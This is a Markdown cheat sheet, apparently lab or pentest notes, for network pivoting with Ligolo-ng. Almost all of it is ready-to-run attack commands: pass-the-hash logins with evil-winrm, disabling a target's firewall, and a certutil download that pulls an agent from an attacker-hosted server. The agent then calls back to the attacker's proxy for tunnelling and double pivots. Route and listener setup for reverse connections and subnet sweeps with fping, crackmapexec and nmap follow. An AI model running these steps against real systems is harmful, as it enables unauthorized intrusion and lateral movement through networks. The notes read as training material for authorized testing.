# Ligolo-ng

## SSH Into TGT or Connect via Evil-Winrm
```bash
ssh -i ~/enterprise/keys/root_rsa USER@TGTIP

ssh -i ~/enterprise/keys/root_rsa root@10.129.229.147

#Disable firewall if possible
## Linux
sudo ufw disable

#Windows with hash
evil-winrm -i 172.16.139.3 -u Administrator -H NTLM HASH
#Windows with Password
evil-winrm -i 172.16.210.5 -u Administrator -p 'PASSWORD'
#Windows with Password File
evil-winrm -i 172.16.210.5 -u Administrator -P 'NAME OF FILE'
```

## Transfer Agent to TGT
```bash

scp -i ~/enterprise/keys/root_rsa \
~/tools/ligolo/ligolo-ng_agent_0.8.1_linux_amd64/agent \
USERNAME@TGTIP:/root/agent

scp -i ~/enterprise/keys/root_rsa \
~/tools/ligolo/ligolo-ng_agent_0.8.1_linux_amd64/agent \
root@10.129.229.147:/root/agent

# If its windows
cd ~/tools/ligolo/ligolo-ng_agent_0.8.1_windows_amd64
#Establish Evil Win-RM session
upload agent.exe

# or

certutil -urlcache -split -f http://TGTIP:8000/agent.exe C:\Users\svc_nexus\Documents\agent.exe

certutil -urlcache -split -f http://172.16.210.3:8000/agent.exe C:\Users\svc_nexus\Documents\agent.exe
```

## Set up Ligolo Interface
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# For Double Pivot
sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up
```

## Start Ligolo Proxy
```bash
cd ~/tools/ligolo/ligolo-ng_proxy_0.8.1_linux_amd64

sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

## In SSH Session: Connect to Ligolo Proxy
```bash
chmod +x /root/agent
/root/agent -connect YOURIP:11601 -ignore-cert

chmod +x /root/agent
/root/agent -connect 10.10.14.6:11601 -ignore-cert

## If its a double pivot
chmod +x /root/agent
/root/agent -connect PIVOTBOX INTERNALIP:11601 -ignore-cert

# If its Windows
./agent.exe -connect 172.16.139.10:11601 -ignore-cert
```

## Confirm session is established and start session
```bash
session --> 1
start

## Double pivot start session 2
```

## Find and add routes
#### In ligolo
```bash
ifconfig
netstat -an
ip route
```
![alt text](image.png)

## Add routes (Examples)
```bash
sudo ip route add 172.16.139.35/32 dev ligolo
sudo ip route add 172.16.139.175/32 dev ligolo
sudo ip route add 172.16.139.3/32 dev ligolo
sudo ip route add 172.16.139.10/32 dev ligolo

# For Double pivot
sudo ip route add 172.16.210.0/24 dev ligolo2
```

## Add a Listener (Examples)
```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555 --tcp
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
listener_add --addr 0.0.0.0:6000 --to 127.0.0.1:6000 --tcp
```
## Find other hosts
```bash
for ip in $(seq 1 254); do ping -c1 -W1 172.16.139.$ip >/dev/null && echo "UP: 172.16.139.$ip"; done
#or
fping -a -g 172.16.0.0/16 2>/dev/null
#or
crackmapexec smb 172.16.0.0/16
#or
nmap scan
```
